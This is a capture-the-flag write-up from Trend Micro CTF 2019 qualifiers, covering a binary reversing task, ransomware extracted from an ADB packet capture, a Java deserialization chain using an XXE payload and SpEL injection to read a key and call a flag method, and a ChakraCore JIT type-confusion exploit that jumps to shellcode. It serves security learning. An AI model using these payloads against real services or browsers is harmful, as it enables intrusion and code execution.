# Trend Micro CTF 2019 Quals

**It's recommended to read our responsive [web version](https://balsn.tw/ctf_writeup/20190906-trendmicroctfqual/) of this writeup.**


 - [Trend Micro CTF 2019 Quals](#trend-micro-ctf-2019-quals)
   - [IoT](#iot)
     - [200 - Reverse](#200---reverse)
   - [Mobile](#mobile)
     - [100 - ADB protocol in PCAP](#100---adb-protocol-in-pcap)
   - [Forensics-Exploit](#forensics-exploit)
     - [300](#300)
     - [400](#400)


## IoT

### 200 - Reverse

1. Replace RGC with UPX nd unpack it
2. Reverse the binary. It will write the following content to `/etc/resolve.conf`
```
nameserver 8.8.8.8
search somethingsomethingdarkside.org
```
3. guessing: look up its `TXT` record we got `GZPGS{NjrfbzrNEZErirefreLbhNer}`
4. It's encrypted/encoded in Caesar cipher. `TMCTF{AwesomeARMReverserYouAre}`

## Mobile

### 100 - ADB protocol in PCAP

Wireshark has a feature `decode as`. Choose ADB so we can further analyze the command.

On packet No.1297, we found this suspicous commands:

```
shell:pm 'install' '/data/local/tmp/Locker.apk'
shell:rm -f '/data/local/tmp/Locker.apk'
shell:am start -n com.locker.updater/.MainActivity
```

Apparently this ransomware `locker.apk` is the key to this challenge. We then extract this APK starting from No. 717. Note that some of the packets are transmitted via SIGCOMP compression. Wireshark seems to fail to decode individual packet. Thus, we have to manully remove those annoying text commands `DATA` and `WRTE` in the data segment.

Anyway, we first follow the TCP stream and save all the data into a hex file. We'll use a script to strip those text commands.

```python
#!/usr/bin/env python3

h = open('hex', 'r').read().strip()

write = b'WRTE'.hex()
a = h.split(write)[1:]
for idx, i in enumerate(a):
    b = bytes.fromhex(i)
    data = b[5*4 + (8 if idx == 0 else 0):]
    if idx == 16:
        data = data.replace(b'DATA\xe9\x90\x00\x00', b'')
    print(data.hex(), end='')
```

After extracting the apk file, use `dex2jar` and `jd-gui` to decompile the program. The password for this ransomware is

```java
  public String getPassword() {
    if (this == null)
      Ff19366e4.access$0(); 
    Exist.started();
    byte[] arrayOfByte = new byte[24];
    arrayOfByte[0] = 24;
    arrayOfByte[1] = 2;
    arrayOfByte[2] = 0;
    arrayOfByte[3] = 31;
    arrayOfByte[4] = 3;
    arrayOfByte[5] = 41;
    arrayOfByte[6] = 11;
    arrayOfByte[7] = 32;
    arrayOfByte[8] = 44;
    arrayOfByte[9] = 47;
    arrayOfByte[10] = 9;
    arrayOfByte[11] = 39;
    arrayOfByte[12] = 47;
    arrayOfByte[13] = 36;
    arrayOfByte[14] = 14;
    arrayOfByte[15] = 50;
    arrayOfByte[16] = 3;
    arrayOfByte[17] = 32;
    arrayOfByte[18] = 37;
    arrayOfByte[19] = 42;
    arrayOfByte[20] = 45;
    arrayOfByte[21] = 47;
    arrayOfByte[22] = 100;
    arrayOfByte[23] = 47;
    arrayOfByte;
    for (byte b = 0; b < arrayOfByte.length; b++) {
      new byte[6][0] = 76;
      new byte[6][1] = 79;
      new byte[6][2] = 67;
      new byte[6][3] = 75;
      new byte[6][4] = 69;
      new byte[6][5] = 82;
      arrayOfByte[b] = (byte)(arrayOfByte[b] ^ new byte[6][b % 6]);
    } 
    return new String(arrayOfByte, StandardCharsets.UTF_8);
  }
```

It's just a simple XOR encryption. The flag is `TMCTF{GoodLuckMyFriend!}`.


## Forensics-Exploit

### 300

In this challenge, we have a `blueprint.war` file.

Unzip this war file, we will get the class files and we can decompile it.

Person.java:

```java=
package com.trendmicro;

import org.xml.sax.SAXException;
import javax.xml.parsers.ParserConfigurationException;
import java.io.IOException;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;
import org.w3c.dom.Document;
import javax.xml.parsers.DocumentBuilder;
import java.io.InputStream;
import javax.xml.parsers.DocumentBuilderFactory;
import java.io.ByteArrayInputStream;
import java.io.ObjectInputStream;
import java.io.Serializable;

public class Person implements Serializable
{
    public String name;
    private static final long serialVersionUID = -559038737L;
    
    public Person(final String name) {
        this.name = name;
    }
    
    private void readObject(final ObjectInputStream aInputStream) throws ClassNotFoundException, IOException, ParserConfigurationException, SAXException {
        final int paramInt = aInputStream.readInt();
        final byte[] arrayOfByte = new byte[paramInt];
        aInputStream.read(arrayOfByte);
        final ByteArrayInputStream localByteArrayInputStream = new ByteArrayInputStream(arrayOfByte);
        final DocumentBuilderFactory localDocumentBuilderFactory = DocumentBuilderFactory.newInstance();
        localDocumentBuilderFactory.setNamespaceAware(true);
        final DocumentBuilder localDocumentBuilder = localDocumentBuilderFactory.newDocumentBuilder();
        final Document localDocument = localDocumentBuilder.parse(localByteArrayInputStream);
        final NodeList nodeList = localDocument.getElementsByTagName("tag");
        final Node node = nodeList.item(0);
        this.name = node.getTextContent();
    }
}
```

CustomOIS.java:

```java=
package com.trendmicro;

import java.util.Arrays;
import java.io.ObjectStreamClass;
import java.io.IOException;
import java.io.InputStream;
import javax.servlet.ServletInputStream;
import java.io.ObjectInputStream;

public class CustomOIS extends ObjectInputStream
{
    private static final String[] whitelist;
    
    static {
        whitelist = new String[] { "com.trendmicro.Person" };
    }
    
    public CustomOIS(final ServletInputStream is) throws IOException {
        super((InputStream)is);
    }
    
    public Class<?> resolveClass(final ObjectStreamClass des) throws IOException, ClassNotFoundException {
        if (!Arrays.asList(CustomOIS.whitelist).contains(des.getName())) {
            throw new ClassNotFoundException("Cannot deserialize " + des.getName());
        }
        return super.resolveClass(des);
    }
}
```

Office.java:

```java=
package com.trendmicro;

import java.nio.file.Files;
import java.nio.file.Paths;
import java.nio.charset.Charset;
import java.io.IOException;
import javax.servlet.ServletException;
import org.springframework.expression.Expression;
import org.springframework.expression.ExpressionParser;
import org.springframework.expression.spel.standard.SpelExpressionParser;
import java.nio.charset.StandardCharsets;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;

@WebServlet({ "/Office" })
public class Office extends HttpServlet
{
    private static final long serialVersionUID = 1L;
    
    protected void doGet(final HttpServletRequest request, final HttpServletResponse response) throws ServletException, IOException {
        final String nametag = request.getParameter("nametag");
        final String keyParam = request.getParameter("key");
        final String keyFileLocation = "/TMCTF2019/key";
        final String key = readFile(keyFileLocation, StandardCharsets.UTF_8);
        if (key.contentEquals(keyParam)) {
            final ExpressionParser parser = (ExpressionParser)new SpelExpressionParser();
            final String expString = "'" + nametag + "' == 'Marshal'";
            final Expression exp = parser.parseExpression(expString);
            final Boolean isMarshal = (Boolean)exp.getValue();
            if (isMarshal) {
                response.getWriter().append("Welcome Marsal");
            }
            else {
                response.getWriter().append("I am sorry but you cannot see the Marshal");
            }
        }
        else {
            response.getWriter().append("Did you forget your keys Marshal?");
        }
    }
    
    protected void doPost(final HttpServletRequest request, final HttpServletResponse response) throws ServletException, IOException {
        this.doGet(request, response);
    }
    
    static String readFile(final String path, final Charset encoding) throws IOException {
        final byte[] encoded = Files.readAllBytes(Paths.get(path, new String[0]));
        return new String(encoded, encoding);
    }
}
```

Server.java:

```java=
package com.trendmicro;

import java.io.IOException;
import javax.servlet.ServletException;
import javax.servlet.ServletInputStream;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;

@WebServlet({ "/jail" })
public class Server extends HttpServlet
{
    private static final long serialVersionUID = 1L;

    protected void doPost(final HttpServletRequest request, final HttpServletResponse response) throws ServletException, IOException {
        try {
            final ServletInputStream is = request.getInputStream();
            final CustomOIS ois = new CustomOIS(is);
            final Person person = (Person)ois.readObject();
            ois.close();
            response.getWriter().append("Sorry " + person.name + ". I cannot let you have the Flag!.");
        }
        catch (Exception e) {
            response.setStatus(500);
            e.printStackTrace(response.getWriter());
        }
    }
}
```

So our target is to unserialize the Person object, then trigger the XXE to read the key.

After that, we can use the key to do SpEL injection and run the `getFlag()`.

Payload:

```java=
package com.trendmicro;

import java.io.ObjectInputStream;
import java.io.FileInputStream;
import java.io.ObjectOutputStream;
import java.io.FileOutputStream;
import java.io.Serializable;
import org.xml.sax.SAXException;
import javax.xml.parsers.ParserConfigurationException;
import java.io.IOException;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;
import org.w3c.dom.Document;
import javax.xml.parsers.DocumentBuilder;
import java.io.InputStream;
import javax.xml.parsers.DocumentBuilderFactory;
import java.io.ByteArrayInputStream;

public class SerializeTest {

    public static void main(String args[]) throws Exception {

        Person p = new Person("kaibro");
        FileOutputStream fos = new FileOutputStream("name.ser");
        ObjectOutputStream os = new ObjectOutputStream(fos);
        os.writeObject(p);
        os.close();

    }
}

class Person implements Serializable {
    public String name;
    private static final long serialVersionUID = -559038737L;

    public Person(final String name) {
        this.name = name;
    }

    private void writeObject(ObjectOutputStream stream) throws ClassNotFoundException, IOException,
        ParserConfigurationException, SAXException {
        stream.writeInt(100);
        String s = ("<?xml version=\"1.0\"?><!DOCTYPE kaibro[<!ENTITY xxe SYSTEM \"file:///TMCTF2019/key\">]><tag>&xxe;</tag>");
        byte[] tmp = s.getBytes();
        stream.write(tmp);
    }
}
```

```python=
import requests

with open("name.ser") as f:
    x  = f.read()
r = requests.post("http://flagmarshal.xyz/jail", data=x, headers={'Content-Type': 'application/x-www-form-urlencoded'})
print r.text
```

=> `Sorry Fo0lMe0nce5hameOnUFoo1MeUCantGetF0oledAgain. I cannot let you have the Flag!.`

And run the `getFlag()`: http://flagmarshal.xyz/Office?key=Fo0lMe0nce5hameOnUFoo1MeUCantGetF0oledAgain&nametag='%2bT(com.trendmicro.jail.Flag).getFlag()%2b'

![](https://github.com/w181496/CTF/raw/master/trendmicro-ctf-2019/forensics300/trend.png)

`TMCTF{F0OlLM3TwIcE1Th@Tz!N1C3}`

### 400

We were asked to pwn a modified ChakraCore Javascript engine. By looking at the diff file:


```diff
diff --git a/lib/Backend/GlobOptFields.cpp b/lib/Backend/GlobOptFields.cpp
index 88bf72d32..6fcb61151 100644
--- a/lib/Backend/GlobOptFields.cpp
+++ b/lib/Backend/GlobOptFields.cpp
@@ -564,7 +564,7 @@ GlobOpt::ProcessFieldKills(IR::Instr *instr, BVSparse<JitArenaAllocator> *bv, bo
         break;
 
     case Js::OpCode::InitClass:
-    case Js::OpCode::InitProto:
+    //case Js::OpCode::InitProto:
     case Js::OpCode::NewScObjectNoCtor:
     case Js::OpCode::NewScObjectNoCtorFull:
         if (inGlobOpt)

```

We can see that the `InitProto` opcode has been commented out inside the [ProcessFieldKills](https://github.com/microsoft/ChakraCore/blob/master/lib/Backend/GlobOptFields.cpp#L291) function, making the engine think that the `InitProto` opcode will not have side effects while doing JIT, which may lead to type confusion in the JITed code.

By searching the internet, we found that there's already a [PoC](https://packetstormsecurity.com/files/151219/Microsoft-Edge-Chakra-JIT-NewScObjectNoCtor-InitProto-Type-Confusion.html) for this vulnerability. So we just downloaded the PoC and started modifying the code. After hours of trying/debugging, we finally managed to let the js engine jump to our shellcode ( the binary has no DEP protection ). The rest is simple: first we execute `execve("/bin/sh", ["/bin/sh", "-c", "ls"])` to get the file list in the challenge directory. After we saw the `flag` file, we just execute `execve("/bin/sh", ["/bin/sh", "-c", "cat flag"])` to get the flag.

Exploit:

```javascript
function opt(o, proto, value) {
    o.b = 0x1337;
    let tmp = {__proto__: proto};
    o.a = value;
}

function main() {
    for (let i = 0; i < 20000; i++) {
        let o = {a: 1, b: 2};
        opt(o, {}, {});
    }
    
    let o = {a: 1, b: 2};
    let leak = {z: {}, x: {}};
    let oo = {c: 0xdead, d: 0xbeef};
    // trigger vulnerability
    // auxSlots pointer will be corrupted
    opt(o, o, oo);

    // allocate some memory ( fill the gape )
    let s = {};
    var buf = new ArrayBuffer(1000);
    var shellcode = new Uint32Array(buf);
    var buf2 = new ArrayBuffer(1000);
    var shellcode2 = new Uint32Array(buf2);
    // allocate our shellcode buffer
    var buf3 = new ArrayBuffer(1000);
    var shellcode3 = new Uint32Array(buf3);
    // write our shellcode
    // shellcode3[0] = 0x90909090;
    // shellcode3[1] = 0x90909090;
    // .....................
   
    let ddd = {x:shellcode, y:shellcode};
    oo.c = shellcode;
    o.a = shellcode;
    // oo.c = 0x9447 will execute "call [rax+0xb8]" in the end
    // while [rax+0xb8] == shellcode3's buffer address
    oo.c = 0x9447;
}
main();
```

Flag:`TMCTF{0ldj1773r_15_7yp3_c0nfu510n_0f_dyn4m1c0bj3c7}`
